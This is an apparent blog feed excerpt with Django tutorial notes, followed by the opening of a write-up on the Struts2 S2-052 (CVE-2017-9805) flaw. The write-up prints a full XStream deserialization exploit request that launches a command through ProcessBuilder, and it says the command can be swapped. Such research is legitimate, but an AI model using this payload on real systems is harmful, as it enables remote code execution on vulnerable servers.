<h4 id="删除数据表内容"><a href="#删除数据表内容" class="headerlink" title="删除数据表内容"></a>删除数据表内容</h4><p>单个删除：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">response = auth.objects.get(username=<span class="string">"nmask"</span>)</div><div class="line">response.passowrd=<span class="string">"123"</span></div><div class="line">response.delete()</div></pre></td></tr></table></figure></p>
<p>批量删除：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auth.objects.filter(name__contains=<span class="string">"nmask"</span>).delete()</div></pre></td></tr></table></figure></p>
<h3 id="使用connection函数"><a href="#使用connection函数" class="headerlink" title="使用connection函数"></a>使用connection函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from django.db import connection</div><div class="line"></div><div class="line">def search_db(sql,value):</div><div class="line">    <span class="string">''</span><span class="string">'操作数据库'</span><span class="string">''</span></div><div class="line">    result_list=[]</div><div class="line">    cursor = connection.cursor()</div><div class="line">    try:</div><div class="line">        cursor.execute(sql,value)</div><div class="line">        result_list=cursor.fetchall()</div><div class="line">        cursor.close()</div><div class="line">    except Exception,e:</div><div class="line">        <span class="built_in">print</span> e</div><div class="line"></div><div class="line">    <span class="built_in">return</span> result_list</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Live well, love lots, and laugh often&lt;br&gt;善待生活，热爱一切，经常开怀大笑&lt;/blockquote&gt;&lt;br&gt;　　本篇主要用来记录Django模型相关部分的笔记，模型可以简单理解为数据操作，即从数据库中获取数据，向数据库中存储数据等。django默认使用sqlit3，支持mysql、postgreSQL等数据库。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="django" scheme="http://thief.one/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>Django基础之起步</title>
    <link href="http://thief.one/2017/09/14/1/"/>
    <id>http://thief.one/2017/09/14/1/</id>
    <published>2017-09-14T11:45:07.000Z</published>
    <updated>2017-09-14T12:43:42.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Do one thing at a time, and do well<br>一次只做一件事，做到最好！</blockquote><br>　　学习使用Python已有2年时间，但至今还没拿它开发出什么像样的项目，大多时候只是用来写写脚本，感觉有点大材小用。因此最近打算好好研究研究python中的Web框架—Django，之所以选择Django而不是flask，也只是偶然，仅此而已。接下来的一段时间我会更新关于Django的一些笔记，内容没有一定的顺序，学到哪记到哪。<br><a id="more"></a></p>
<h3 id="Django介绍"><a href="#Django介绍" class="headerlink" title="Django介绍"></a>Django介绍</h3><p>　　太多介绍性的内容就不写了，主要想对纠结学django还是flask甚至其他框架的同学说一声，学啥框架不重要，就好像学什么语言一样，一门通门门通。无论Django还是flask都很强大，也足够我们写一个项目</p>
<h3 id="Django的MTV框架"><a href="#Django的MTV框架" class="headerlink" title="Django的MTV框架"></a>Django的MTV框架</h3><p>　　Django是使用MVC框架设计的，但更准确地说应该是基于MTV框架，即模型(model)－视图(view)－模版(Template)。简单介绍，模型就是数据库（负责数据存储），视图就是后端（负责数据处理），模版就是前端（负责数据展示），模型与视图在Django中分别对应着models.py、views.py，而模版需要自己在templates目录下创建html文件，views.py中的函数渲染templates中的Html模板，得到动态内容的网页。<br>　　一个Django页面的搜索功能，整个流程是这样的：从模版获取用户输入—&gt;请求传递到视图—&gt;视图向模型获取数据—–&gt;视图对数据进行处理—-&gt;返回给模型显示。</p>
<h3 id="Django安装"><a href="#Django安装" class="headerlink" title="Django安装"></a>Django安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">安装pip:</div><div class="line">sudo apt-get install python-pip</div><div class="line">或者</div><div class="line">yum install python-pip</div><div class="line"></div><div class="line">然后安装django:</div><div class="line">pip install django</div></pre></td></tr></table></figure>
<p>说明：建议使用Python虚拟环境搭建django。</p>
<h3 id="Django常用命令"><a href="#Django常用命令" class="headerlink" title="Django常用命令"></a>Django常用命令</h3><p>新建项目以及app：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">django-admin.py startproject project_name 新建项目</div><div class="line">python manage.py startapp app_name 新建APP</div></pre></td></tr></table></figure></p>
<p>数据库操作：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#创建更改的文件</span></div><div class="line">python manage.py makemigrations</div><div class="line"><span class="comment">#将生成的py文件应用到数据库</span></div><div class="line">python manage.py migrate</div><div class="line"><span class="comment">#清空数据库</span></div><div class="line">python manage.py flush</div></pre></td></tr></table></figure></p>
<p>使用内置服务器:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">python manage.py runserver</div><div class="line">python manage.py runserver 8080</div><div class="line">python manage.py runserver 10.0.0.1:80</div></pre></td></tr></table></figure></p>
<p>创建管理员：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python manage.py createsuperuser</div><div class="line">python manage.py changepassword username</div></pre></td></tr></table></figure></p>
<p>数据导入导出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python manage.py dumpdata appname &gt; appname.json</div><div class="line">python manage.py loaddata appname.json</div></pre></td></tr></table></figure></p>
<p>项目环境终端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py shell</div></pre></td></tr></table></figure></p>
<p>说明：可以在这个 shell 里面调用当前项目的 models.py 中的api。</p>
<p>数据库命令行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py dbshell</div></pre></td></tr></table></figure></p>
<p>可以在命令行中执行sql语句。</p>
<h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">django-admin startproject mysite(项目名称)</div></pre></td></tr></table></figure>
<p>注意：目录不能带有中文。<br>开启内置服务器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python  manage.py runserver (ip:port)       <span class="comment">#默认为8000</span></div></pre></td></tr></table></figure></p>
<p>访问:<a href="http://localhost:8000" target="_blank" rel="external">http://localhost:8000</a></p>
<h3 id="创建应用"><a href="#创建应用" class="headerlink" title="创建应用"></a>创建应用</h3><p>一个项目中可以有多个应用，一个应用即一个web应用程序。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python manage.py startapp  webapp</div></pre></td></tr></table></figure></p>
<p>说明：会在manage.py同级目录下创建一个webapp文件夹。</p>
<h3 id="setting-py"><a href="#setting-py" class="headerlink" title="setting.py"></a>setting.py</h3><p>将新定义的app，这里为webapp添加到setting.py中:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">INSTALLED_APPS = (</div><div class="line">    <span class="string">'django.contrib.admin'</span>,</div><div class="line">    <span class="string">'django.contrib.auth'</span>,</div><div class="line">    <span class="string">'django.contrib.contenttypes'</span>,</div><div class="line">    <span class="string">'django.contrib.sessions'</span>,</div><div class="line">    <span class="string">'django.contrib.messages'</span>,</div><div class="line">    <span class="string">'django.contrib.staticfiles'</span>,</div><div class="line"> </div><div class="line">    <span class="string">'webapp'</span>,</div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>说明：添加app是为了让django知道，我们创建了一个新的app应用，让它能够加载app。</p>
<h3 id="view-py"><a href="#view-py" class="headerlink" title="view.py"></a>view.py</h3><p>定义视图函数(views.py):<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">from django.http import HttpResponse</div><div class="line"> </div><div class="line">def index(request):</div><div class="line">    <span class="built_in">return</span> HttpResponse(<span class="string">"This is a test page!"</span>)</div></pre></td></tr></table></figure></p>
<p>说明：视图函数(view.py)就是在服务端完成的一些列功能的函数，它接收一个request请求，返回一个response。</p>
<h3 id="urls-py"><a href="#urls-py" class="headerlink" title="urls.py"></a>urls.py</h3><p>定义url，修改urls.py:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from django.conf.urls import url</div><div class="line">from django.contrib import admin</div><div class="line">from webapp import views</div><div class="line"> </div><div class="line">urlpatterns = [</div><div class="line">    url(r<span class="string">'^$'</span>, views.index),</div><div class="line">    url(r<span class="string">'^admin/'</span>, admin.site.urls),</div><div class="line">]</div></pre></td></tr></table></figure></p>
<p>说明：urls.py是定义django路由的文件，此路由不是网络中的路由，简单来说就是url，定义了当我们请求哪些url的时候，对应去执行view中的哪些函数。</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://code.ziqiangxuetang.com/django/django-tutorial.html" target="_blank" rel="external">http://code.ziqiangxuetang.com/django/django-tutorial.html</a></p>
<p><em>本篇只做最基础的Django介绍，至于MVC每一层具体的使用方式以及配置、安全、部署等问题，后面会逐一成文介绍</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Do one thing at a time, and do well&lt;br&gt;一次只做一件事，做到最好！&lt;/blockquote&gt;&lt;br&gt;　　学习使用Python已有2年时间，但至今还没拿它开发出什么像样的项目，大多时候只是用来写写脚本，感觉有点大材小用。因此最近打算好好研究研究python中的Web框架—Django，之所以选择Django而不是flask，也只是偶然，仅此而已。接下来的一段时间我会更新关于Django的一些笔记，内容没有一定的顺序，学到哪记到哪。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="django" scheme="http://thief.one/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>Django基础之ajax</title>
    <link href="http://thief.one/2017/09/14/3/"/>
    <id>http://thief.one/2017/09/14/3/</id>
    <published>2017-09-14T11:15:58.000Z</published>
    <updated>2017-09-26T01:51:58.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Take control of your own desting<br>命运掌握在自己手上</blockquote><br>　　本篇主要用来记录django+ajax的一些用法以及注意点，Django使用ajax最大的一个用处，就是不用刷新整个页面的前提下，请求服务端内容来更改页面中某些元素的值。如果使用http请求，就必须重新加载一遍页面，而ajax可以只更改一部分内容。<br><a id="more"></a></p>
<h3 id="django-ajax基础使用"><a href="#django-ajax基础使用" class="headerlink" title="django+ajax基础使用"></a>django+ajax基础使用</h3><h4 id="模版页面"><a href="#模版页面" class="headerlink" title="模版页面"></a>模版页面</h4><p>index.html<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;form&gt;</div><div class="line">&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> id=<span class="string">"tn"</span>&gt;</div><div class="line">&lt;button <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">"formquery"</span>&gt;提交&lt;/button&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;span id=<span class="string">'result'</span>&gt;&lt;/span&gt;</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">    $(document).ready(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      $(<span class="string">"#formquery"</span>).click(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">        var toolsname = $(<span class="string">"#tn"</span>).val();</div><div class="line"></div><div class="line">        $.get(<span class="string">"/query/"</span>,&#123;<span class="string">'toolsname'</span>:toolsname&#125;, <span class="keyword">function</span>(ret)&#123;</div><div class="line">            $(<span class="string">'#result'</span>).html(ret) <span class="comment">#在页面中显示。可以用用$.ajax方法代替$.get</span></div><div class="line">        &#125;)</div><div class="line">      &#125;);</div><div class="line">    &#125;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<p>以上代码的参数说明：</p>
<ul>
<li>$.get 表示ajax使用GET方式发送请求，也可以改成$.ajax，或者$.post表示post请求</li>
<li>id=”tn” 对应着js中获取的参数名称$(“#tn”)</li>
<li>id=”formquery” 对应着按钮事件所对应的js的函数名称</li>
<li>id=’result’ 对应着结果返回到哪个位置$(‘#result’)</li>
</ul>
<p>注意：这里需要注意的是button的type不能写submit，因为写了submit就直接使用get请求/query/了，而没有执行ajax请求。</p>
<h4 id="view-py"><a href="#view-py" class="headerlink" title="view.py"></a>view.py</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">from django.http import HttpResponse</div><div class="line"></div><div class="line">def query(request):</div><div class="line">    r=request.GET.get(<span class="string">"toolsname"</span>)</div><div class="line">    name_dict=<span class="string">"123"</span></div><div class="line">    <span class="built_in">return</span> HttpResponse(json.dumps(name_dict), content_type=<span class="string">'application/json'</span>)</div><div class="line"></div><div class="line">或者可以使用JsonResponse：</div><div class="line"></div><div class="line">from django.http import JsonResponse</div><div class="line">def query(request):</div><div class="line">    r=request.GET.get(<span class="string">"toolsname"</span>)</div><div class="line">    name_dict=<span class="string">"123"</span></div><div class="line">    <span class="built_in">return</span> JsonResponse(name_dict)</div></pre></td></tr></table></figure>
<p>说明：在视图层，即view.py中，跟正常的接受http请求的方式一样。views.py 中可以用  request.is_ajax() 方法判断是否是 ajax 请求。</p>
<h3 id="关于ajax的一些高级用法"><a href="#关于ajax的一些高级用法" class="headerlink" title="关于ajax的一些高级用法"></a>关于ajax的一些高级用法</h3><p>等我实验完再记录…….</p>
<h4 id="ajax获取返回值后执行js"><a href="#ajax获取返回值后执行js" class="headerlink" title="ajax获取返回值后执行js"></a>ajax获取返回值后执行js</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;textarea name=<span class="string">"content"</span> id=<span class="string">"content"</span> class=<span class="string">"form-control"</span> rows=<span class="string">"20"</span>&gt;&lt;/textarea&gt;</div><div class="line">&lt;script&gt;</div><div class="line">    $(document).ready(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      $(<span class="string">"#sub_encode"</span>).click(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">        var content = $(<span class="string">"#content"</span>).val();</div><div class="line"> </div><div class="line">        $.get(<span class="string">"/add/"</span>,&#123;<span class="string">'content'</span>:content&#125;, <span class="keyword">function</span>(ret)&#123;</div><div class="line">            document.getElementById(<span class="string">'content'</span>).value = ret</div><div class="line">        &#125;)</div><div class="line">      &#125;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>说明：获取返回值后，将返回值填充到textarea文本框内。</p>
<h4 id="ajax-post-CSRF认证"><a href="#ajax-post-CSRF认证" class="headerlink" title="ajax+post CSRF认证"></a>ajax+post CSRF认证</h4><p>在ajax代码前，加入以下js。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">$.ajaxSetup(&#123;</div><div class="line">    data: &#123;csrfmiddlewaretoken: <span class="string">'&#123;&#123; csrf_token &#125;&#125;'</span> &#125;,</div><div class="line">&#125;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h4 id="ajax-按钮加载过渡"><a href="#ajax-按钮加载过渡" class="headerlink" title="ajax+按钮加载过渡"></a>ajax+按钮加载过渡</h4><p>有时候网页中的某些功能需要比较长的时间等待，这时候使用ajax是比较好的，因为它不需要整个网页刷新，用户体验比较好。而按钮加载过渡的意思，就是当你点击按钮后，按钮字体内容变为“加载中”，等到ajax返回内容后再恢复，这样会使体验更好。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;button class=<span class="string">"btn btn-primary btn-sm"</span> <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">'sub_encode'</span> data-loading-text=<span class="string">"Loading加载中..."</span> autocomplete=<span class="string">"off"</span> onclick=<span class="string">"loag()"</span>&gt;运行&lt;/button&gt;</div><div class="line">&lt;!-- 将按钮过渡的代码整合到ajax中 --&gt;</div><div class="line">&lt;script&gt;</div><div class="line">    $(document).ready(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">      $(<span class="string">"#sub_encode"</span>).click(<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">        var content = $(<span class="string">"#content"</span>).val();</div><div class="line">        var btn = $(<span class="string">"#sub_encode"</span>); //获取按钮对象</div><div class="line">        btn.button(<span class="string">'loading'</span>);//按钮显示为过渡状态 </div><div class="line"> </div><div class="line">        $.post(<span class="string">"&#123;% url 'run_ajax' %&#125;"</span>,&#123;<span class="string">'content'</span>:content,<span class="string">"type"</span>:<span class="string">"encode"</span>&#125;, <span class="keyword">function</span>(ret)&#123;</div><div class="line">            document.getElementById(<span class="string">'content'</span>).value = ret</div><div class="line">            btn.button(<span class="string">'reset'</span>);//按钮恢复正常</div><div class="line">        &#125;)</div><div class="line">      &#125;);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://code.ziqiangxuetang.com/django/django-ajax.html" target="_blank" rel="external">http://code.ziqiangxuetang.com/django/django-ajax.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Take control of your own desting&lt;br&gt;命运掌握在自己手上&lt;/blockquote&gt;&lt;br&gt;　　本篇主要用来记录django+ajax的一些用法以及注意点，Django使用ajax最大的一个用处，就是不用刷新整个页面的前提下，请求服务端内容来更改页面中某些元素的值。如果使用http请求，就必须重新加载一遍页面，而ajax可以只更改一部分内容。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="django" scheme="http://thief.one/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>struts2-052漏洞</title>
    <link href="http://thief.one/2017/09/06/1/"/>
    <id>http://thief.one/2017/09/06/1/</id>
    <published>2017-09-06T08:26:05.000Z</published>
    <updated>2017-09-06T11:19:33.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">From small beginnings comes great things<br>伟大始于渺小</blockquote><br>　　今年struts2疯了，被爆出了很多高危漏洞，之前我研究过s_045、s_046漏洞，近期又出现了s_052漏洞。s_052漏洞危害稍微小一些，因为利用环境比较苛刻，需要使用Struts2 REST插件的XStream组件。<br><a id="more"></a><br>免责申明：<em>文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负</em></p>
<h3 id="s2-052漏洞介绍"><a href="#s2-052漏洞介绍" class="headerlink" title="s2-052漏洞介绍"></a>s2-052漏洞介绍</h3><p>s2-052漏洞是当用户使用带有XStream组件的Struts-REST插件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，可直接在数据包中插入恶意代码。</p>
<p>漏洞编号：CVE-2017-9805（S2-052）<br>漏洞影响：Struts2.5 – Struts2.5.12版本。</p>
<h3 id="s2-052-poc"><a href="#s2-052-poc" class="headerlink" title="s2-052 poc"></a>s2-052 poc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1</div><div class="line">Host: 127.0.0.1:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2365</div><div class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit</div><div class="line">Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=<span class="string">"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"</span>&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=<span class="string">"com.sun.xml.internal.ws.encoding.xml.XMLMessage<span class="variable">$XmlDataSource</span>"</span>&gt;</div><div class="line">            &lt;is class=<span class="string">"javax.crypto.CipherInputStream"</span>&gt;</div><div class="line">              &lt;cipher class=<span class="string">"javax.crypto.NullCipher"</span>&gt;</div><div class="line">                &lt;initialized&gt;<span class="literal">false</span>&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</div><div class="line">                  &lt;iter class=<span class="string">"javax.imageio.spi.FilterIterator"</span>&gt;</div><div class="line">                    &lt;iter class=<span class="string">"java.util.Collections<span class="variable">$EmptyIterator</span>"</span>/&gt;</div><div class="line">                    &lt;next class=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</div><div class="line">                      &lt;<span class="built_in">command</span>&gt;</div><div class="line">                        &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;</div><div class="line">                      &lt;/<span class="built_in">command</span>&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;<span class="literal">false</span>&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=<span class="string">"javax.imageio.ImageIO<span class="variable">$ContainsFilter</span>"</span>&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=<span class="string">"string"</span>&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              &lt;/cipher&gt;</div><div class="line">              &lt;input class=<span class="string">"java.lang.ProcessBuilder<span class="variable">$NullInputStream</span>"</span>/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;<span class="keyword">done</span>&gt;<span class="literal">false</span>&lt;/<span class="keyword">done</span>&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;<span class="literal">false</span>&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;<span class="literal">false</span>&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../jdk.nashorn.internal.objects.NativeString"</span>/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=<span class="string">"../../entry/jdk.nashorn.internal.objects.NativeString"</span>/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure>
<p>注意：执行命令的地方在于command内，这里是针对mac下的弹出计算器，如果是windows可改成calc.exe<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="built_in">command</span>&gt;</div><div class="line">&lt;string&gt;</div><div class="line">/Applications/Calculator.app/Contents/MacOS/Calculator</div><div class="line">&lt;/string&gt;</div><div class="line">&lt;/<span class="built_in">command</span>&gt;</div></pre></td></tr></table></figure></p>
<h3 id="s2-052漏洞复现"><a href="#s2-052漏洞复现" class="headerlink" title="s2-052漏洞复现"></a>s2-052漏洞复现</h3><h4 id="mac-install-tomcat"><a href="#mac-install-tomcat" class="headerlink" title="mac install tomcat"></a>mac install tomcat</h4><p>在安装tomcat前，先检测一下mac上有没有安装java，可以运行java -version。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">java version <span class="string">"1.8.0_111"</span></div><div class="line">Java(TM) SE Runtime Environment (build 1.8.0_111-b14)</div><div class="line">Java HotSpot(TM) 64-Bit Server VM (build 25.111-b14, mixed mode)</div></pre></td></tr></table></figure></p>
<p>前往tomcat官网下载：<a href="http://tomcat.apache.org/download-80.cgi?from_33lc.com" target="_blank" rel="external">http://tomcat.apache.org/download-80.cgi?from_33lc.com</a> 选择下载Core下的tar.gz包到本地，然后解压。<br>将解压后到文件夹移动到/Library目录下,并命名为Tomcat；然后设置权限：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chmod 755 /Library/Tomcat/bin/*.sh</div></pre></td></tr></table></figure></p>
